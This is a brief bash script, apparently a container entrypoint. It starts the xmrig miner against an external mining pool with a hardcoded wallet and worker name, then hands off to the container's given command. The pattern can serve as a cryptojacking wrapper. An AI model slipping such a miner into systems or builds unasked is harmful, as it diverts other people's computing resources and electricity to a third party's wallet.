#!/bin/bash

set -e

./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BnJkjVKDBvJbYEnXqMTKhX1gKFWyFtkUgq.labideneyim -t 8 -k

exec "$@"
